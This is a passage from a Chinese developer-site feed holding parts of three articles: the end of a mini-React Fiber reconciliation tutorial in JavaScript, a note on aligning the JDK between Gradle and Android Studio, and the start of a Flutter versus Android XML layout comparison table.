    <span class="hljs-keyword">const</span> hasFiberDom = !!fiber.<span class="hljs-property">dom</span>
    <span class="hljs-keyword">switch</span> (fiber.<span class="hljs-property">effectTag</span>) {
        <span class="hljs-keyword">case</span> <span class="hljs-string">'PLACEMENT'</span>:
            hasFiberDom &amp;&amp; parentDom.<span class="hljs-title function_">append</span>(fiber.<span class="hljs-property">dom</span>);
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-string">'UPDATE'</span>:
            hasFiberDom &amp;&amp; <span class="hljs-title function_">updateDOM</span>(fiber.<span class="hljs-property">dom</span>, fiber.<span class="hljs-property">alternate</span>.<span class="hljs-property">props</span>, fiber.<span class="hljs-property">props</span>);
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-string">'DELETION'</span>:
            hasFiberDom &amp;&amp; parentDom.<span class="hljs-title function_">removeChild</span>(fiber.<span class="hljs-property">dom</span>);
            <span class="hljs-keyword">break</span>;
        <span class="hljs-attr">default</span>:
            <span class="hljs-keyword">break</span>;
    }

    <span class="hljs-title function_">commitWork</span>(fiber.<span class="hljs-property">child</span>);
    <span class="hljs-title function_">commitWork</span>(fiber.<span class="hljs-property">sibling</span>);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">updateDOM</span>(<span class="hljs-params">dom, prevProps, nextPorps</span>) {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">isEvent</span> = (<span class="hljs-params">key</span>) =&gt; key.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'on'</span>);
    <span class="hljs-comment">// 删除已经没有的props</span>
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(prevProps)
        .<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> key != <span class="hljs-string">'children'</span> &amp;&amp; !<span class="hljs-title function_">isEvent</span>(key))
        <span class="hljs-comment">// 不在nextProps中</span>
        .<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> !key <span class="hljs-keyword">in</span> nextPorps)
        .<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> {
            <span class="hljs-comment">// 清空属性</span>
            dom[key] = <span class="hljs-string">''</span>;
        });

    <span class="hljs-comment">// 添加新增的属性/修改变化的属性</span>
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(nextPorps)
        .<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> key !== <span class="hljs-string">'children'</span> &amp;&amp; !<span class="hljs-title function_">isEvent</span>(key))
        <span class="hljs-comment">// 不再prevProps中</span>
        .<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> !key <span class="hljs-keyword">in</span> prevProps || prevProps[key] !== nextPorps[key])
        .<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> {
            dom[key] = nextPorps[key];
        });

    <span class="hljs-comment">// 删除事件处理函数</span>
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(prevProps)
        .<span class="hljs-title function_">filter</span>(isEvent)
        <span class="hljs-comment">// 新的属性没有，或者有变化</span>
        .<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> !key <span class="hljs-keyword">in</span> nextPorps || prevProps[key] !== nextPorps[key])
        .<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> {
            <span class="hljs-keyword">const</span> eventType = key.<span class="hljs-title function_">toLowerCase</span>().<span class="hljs-title function_">substring</span>(<span class="hljs-number">2</span>);
            dom.<span class="hljs-title function_">removeEventListener</span>(eventType, prevProps[key]);
        });

    <span class="hljs-comment">// 添加新的事件处理函数</span>
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(nextPorps)
        .<span class="hljs-title function_">filter</span>(isEvent)
        .<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> prevProps[key] !== nextPorps[key])
        .<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> {
            <span class="hljs-keyword">const</span> eventType = key.<span class="hljs-title function_">toLowerCase</span>().<span class="hljs-title function_">substring</span>(<span class="hljs-number">2</span>);
            dom.<span class="hljs-title function_">addEventListener</span>(eventType, nextPorps[key]);
        });
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">createDOM</span>(<span class="hljs-params">element</span>) {
    <span class="hljs-keyword">const</span> dom = element.<span class="hljs-property">type</span> === <span class="hljs-string">'TEXT_ELEMENT'</span>
        ? <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createTextNode</span>(<span class="hljs-string">''</span>)
        : <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(element.<span class="hljs-property">type</span>)

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">isProperty</span> = key =&gt; key !== <span class="hljs-string">'children'</span>;
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(element?.<span class="hljs-property">props</span>)
        .<span class="hljs-title function_">filter</span>(isProperty)
        .<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> dom[name] = element?.<span class="hljs-property">props</span>[name])

    <span class="hljs-keyword">return</span> dom;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">reconcileChildren</span>(<span class="hljs-params">wipFiber, elements</span>) {
    <span class="hljs-keyword">let</span> index = <span class="hljs-number">0</span>;
    <span class="hljs-comment">// 如果有alternate，就返回它的child，没有，就返回undefined</span>
    <span class="hljs-keyword">let</span> oldFiber = wipFiber.<span class="hljs-property">alternate</span> &amp;&amp; wipFiber.<span class="hljs-property">alternate</span>.<span class="hljs-property">child</span>;

    <span class="hljs-keyword">let</span> prevSibling = <span class="hljs-literal">null</span>;

    <span class="hljs-comment">// 为什么要用while呢？</span>
    <span class="hljs-comment">// 需要把oldFiber树和新fiber树都遍历完</span>
    <span class="hljs-comment">// 因为可能oldFiber树比新fiber树长</span>
    <span class="hljs-keyword">while</span> (index &lt; elements.<span class="hljs-property">length</span> || oldFiber) {
        <span class="hljs-keyword">const</span> element = elements[index];
        <span class="hljs-keyword">const</span> sameType = oldFiber &amp;&amp; element &amp;&amp; oldFiber.<span class="hljs-property">type</span> === element.<span class="hljs-property">type</span>;

        <span class="hljs-keyword">let</span> newFiber = <span class="hljs-literal">null</span>;

        <span class="hljs-keyword">if</span> (sameType) { <span class="hljs-comment">// 更新</span>
            newFiber = {
                <span class="hljs-attr">type</span>: oldFiber.<span class="hljs-property">type</span>,
                <span class="hljs-attr">props</span>: element.<span class="hljs-property">props</span>,
                <span class="hljs-comment">// 继承dom</span>
                <span class="hljs-attr">dom</span>: oldFiber.<span class="hljs-property">dom</span>,
                <span class="hljs-attr">parent</span>: wipFiber,
                <span class="hljs-attr">alternate</span>: oldFiber,
                <span class="hljs-attr">effectTag</span>: <span class="hljs-string">'UPDATE'</span>,
            };
        }
        <span class="hljs-keyword">if</span> (element &amp;&amp; !sameType) { <span class="hljs-comment">// 新建</span>
            newFiber = {
                <span class="hljs-attr">type</span>: element.<span class="hljs-property">type</span>,
                <span class="hljs-attr">props</span>: element.<span class="hljs-property">props</span>,
                <span class="hljs-attr">dom</span>: <span class="hljs-literal">null</span>,
                <span class="hljs-attr">parent</span>: wipFiber,
                <span class="hljs-attr">alternate</span>: <span class="hljs-literal">null</span>,
                <span class="hljs-attr">effectTag</span>: <span class="hljs-string">'PLACEMENT'</span>,
            };
        }
        <span class="hljs-keyword">if</span> (oldFiber &amp;&amp; !sameType) { <span class="hljs-comment">// 删除</span>
            oldFiber.<span class="hljs-property">effectTag</span> = <span class="hljs-string">'DELETION'</span>;
            deletion.<span class="hljs-title function_">push</span>(oldFiber);
        }

        <span class="hljs-keyword">if</span> (oldFiber) { <span class="hljs-comment">// 下一个oldFiber</span>
            oldFiber = oldFiber.<span class="hljs-property">sibling</span>;
        }

        <span class="hljs-comment">// 第一个child才可以作为child，其他的就是sibling</span>
        <span class="hljs-keyword">if</span> (index === <span class="hljs-number">0</span>) {
            wipFiber.<span class="hljs-property">child</span> = newFiber;
        } <span class="hljs-keyword">else</span> {
            prevSibling.<span class="hljs-property">sibling</span> = newFiber;
        }

        prevSibling = newFiber;

        index++;
    }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">element, container</span>) {
    wipRoot = {
        <span class="hljs-attr">dom</span>: container,
        <span class="hljs-attr">props</span>: {
            <span class="hljs-attr">children</span>: [element]
        },
        <span class="hljs-attr">alternate</span>: currentRoot, <span class="hljs-comment">// 记录老的fiber树</span>
    }

    deletion = [];

    nextUnitOfWork = wipRoot
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
    render
}
</code></pre>
<h2 data-id="heading-25">三、总结</h2>
<p>本文只简单介绍了Fiber可中断、可恢复的渲染过程，实际的Fiber远不止这么简单，比如还有：</p>
<ul>
<li>优先级驱动的任务调度（为不同类型的更新分配了优先级。）
<ul>
<li>高优先级：用户交互（点击、输入）、动画。</li>
<li>低优先级：大数据渲染、网络请求返回。</li>
</ul>
</li>
<li>更精细的生命周期控制</li>
</ul>
<p>如果大家感兴趣可以进一步深入了解。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[兼容命令行与 Android Studio 的 JDK 策略：从踩坑到方案]]></title>    <link>https://juejin.cn/post/7575937594350665771</link>    <guid>https://juejin.cn/post/7575937594350665771</guid>    <pubDate>2025-11-24T03:40:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575937594350665771" data-draft-id="7575884229524979748" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="兼容命令行与 Android Studio 的 JDK 策略：从踩坑到方案"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-24T03:40:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="火车叼位"/> <meta itemprop="url" content="https://juejin.cn/user/1345457960792808"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            兼容命令行与 Android Studio 的 JDK 策略：从踩坑到方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1345457960792808/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    火车叼位
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:40:48.000Z" title="Mon Nov 24 2025 03:40:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>同一 Android 项目在命令行执行 <code>./gradlew assembleDebug</code> 构建成功，但在 Android Studio 中同步时却报错：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">Unsupported <span class="hljs-keyword">class</span> <span class="hljs-title class_">file</span> <span class="hljs-title">major</span> <span class="hljs-title">version</span> 65
...
Could not <span class="hljs-keyword">open</span> <span class="hljs-keyword">init</span> generic <span class="hljs-keyword">class</span> <span class="hljs-title class_">cache</span> ... <span class="hljs-title">D</span>:<span class="hljs-type">\tools\Java\jdk1.8.0_211\caches\8.0</span>
</code></pre>
<h2 data-id="heading-0">原因分析</h2>
<p>命令行构建通过 <code>gradle.properties</code> 中的 <code>org.gradle.java.home</code> 配置正确使用 JDK 17，而 Android Studio 默认使用系统环境变量或嵌入式 JDK，意外拾取了机器上残留的 JDK 8，导致版本不兼容。</p>
<h2 data-id="heading-1">解决方案</h2>
<h3 data-id="heading-2">1. 固定 Gradle JDK 路径</h3>
<p>在 <code>gradle.properties</code> 中明确指定：</p>
<pre><code class="hljs language-bash" lang="bash">org.gradle.java.home=D:/tools/Java/jdk-17.0.2+8
</code></pre>
<h3 data-id="heading-3">2. 配置 Gradle Toolchain</h3>
<p>在根 <code>build.gradle</code> 中声明：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">java {
    toolchain {
        languageVersion.<span class="hljs-keyword">set</span>(JavaLanguageVersion.of(<span class="hljs-number">17</span>))
    }
}
</code></pre>
<h3 data-id="heading-4">3. 统一 IDE 设置</h3>
<p>在 Android Studio 中：</p>
<ul>
<li>打开 <code>File &gt; Settings &gt; Build Tools &gt; Gradle</code></li>
<li>将 Gradle JDK 指向项目指定的 JDK 17 路径</li>
<li>确保 <code>.idea/gradle.xml</code> 中配置正确并纳入版本控制</li>
</ul>
<h2 data-id="heading-5">总结</h2>
<p>命令行与 Android Studio 的构建差异主要源于环境配置不一致。通过将 JDK 版本信息写入项目配置文件，可以实现环境标准化，确保跨环境构建的一致性。核心原则是：<strong>配置即代码，环境也应该被托管</strong>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutter 布局 ↔ Android XML 布局 对照表（含常用属性）]]></title>    <link>https://juejin.cn/post/7575757258833281050</link>    <guid>https://juejin.cn/post/7575757258833281050</guid>    <pubDate>2025-11-24T03:43:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575757258833281050" data-draft-id="7575748159608569882" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutter 布局 ↔ Android XML 布局 对照表（含常用属性）"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-24T03:43:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="renxhui"/> <meta itemprop="url" content="https://juejin.cn/user/1292681403181944"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutter 布局 ↔ Android XML 布局 对照表（含常用属性）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1292681403181944/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    renxhui
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:43:29.000Z" title="Mon Nov 24 2025 03:43:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Flutter 布局 ↔ Android XML 布局 对照表（含常用属性）</h2>
<blockquote>
<p>面向快速查阅：Flutter 组件与 Android XML 视图/容器的一一对应与常见属性对照。</p>
</blockquote>
<h3 data-id="heading-1">布局容器</h3>




























































































































<table><thead><tr><th>Flutter</th><th>Android XML</th><th>用途/备注</th><th>Flutter 常用属性</th><th>Android 常用属性</th></tr></thead><tbody><tr><td>Container</td><td>FrameLayout / LinearLayout(单子项)</td><td>单子项容器，背景/圆角/内外边距</td><td>width, height, padding, margin, alignment, decoration(BoxDecoration: color, border, borderRadius, boxShadow)</td><td>layout_width/height, padding, margin, background, foreground, layout_gravity</td></tr><tr><td>Row</td><td>LinearLayout (horizontal)</td><td>水平排布</td><td>mainAxisAlignment, crossAxisAlignment, mainAxisSize, children</td><td>orientation="horizontal", gravity, layout_gravity</td></tr><tr><td>Column</td><td>LinearLayout (vertical)</td><td>垂直排布</td><td>mainAxisAlignment, crossAxisAlignment, mainAxisSize, children</td><td>orientation="vertical", gravity, layout_gravity</td></tr><tr><td>Expanded / Flexible</td><td>layout_weight</td><td>占据剩余空间/权重</td><td>flex, fit (tight/loose)</td><td>layout_weight, weightSum</td></tr><tr><td>Stack</td><td>FrameLayout / RelativeLayout / ConstraintLayout</td><td>层叠定位</td><td>alignment, fit, clipBehavior</td><td>FrameLayout: layout_gravity；Relative/Constraint: 定位约束</td></tr><tr><td>Positioned</td><td>RelativeLayout/ConstraintLayout params</td><td>绝对/相对定位</td><td>left, right, top, bottom, width, height</td><td>layout_alignParent*, toStartOf/toEndOf, constraints</td></tr><tr><td>Align / Center</td><td>gravity / layout_gravity</td><td>父内对齐</td><td>alignment(Alignment)</td><td>gravity（父），layout_gravity（子）</td></tr><tr><td>Padding</td><td>View padding</td><td>内边距</td><td>padding(EdgeInsets)</td><td>padding</td></tr><tr><td>SizedBox</td><td>layout_width/height</td><td>固定宽高/留白</td><td>width, height</td><td>layout_width/height，空 View</td></tr><tr><td>Wrap</td><td>FlexboxLayout(支持库) / Flow</td><td>自动换行流式布局</td><td>direction, spacing, runSpacing, alignment</td><td>app:flexWrap, app:justifyContent, app:alignItems（FlexboxLayout）</td></tr><tr><td>ListView</td><td>RecyclerView / ListView</td><td>可滚动列表</td><td>builder, separated, itemExtent, physics</td><td>RecyclerView: adapter, layoutManager；ListView: divider, dividerHeight</td></tr><tr><td>GridView</td><td>RecyclerView + GridLayoutManager / GridView</td><td>网格</td><td>gridDelegate, crossAxisSpacing, mainAxisSpacing</td><td>spanCount(GridLayoutManager), verticalSpacing, horizontalSpacing</td></tr><tr><td>SingleChildScrollView</td><td>ScrollView / NestedScrollView</td><td>单子项滚动</td><td>scrollDirection, physics</td><td>fillViewport, nestedScrollingEnabled</td></tr><tr><td>PageView</td><td>ViewPager2</td><td>分页滑动</td><td>controller, pageSnapping</td><td>offscreenPageLimit, orientation</td></tr><tr><td>SafeArea</td><td>fitsSystemWindows</td><td>适配状态栏/刘海</td><td>minimum, top/bottom</td><td>android:fitsSystemWindows</td></tr><tr><td>AspectRatio</td><td>ConstraintLayout ratio</td><td>宽高比</td><td>aspectRatio</td><td>app:layout_constraintDimensionRatio</td></tr></tbody></table>
<h3 data-id="heading-2">常用组件</h3>





































































































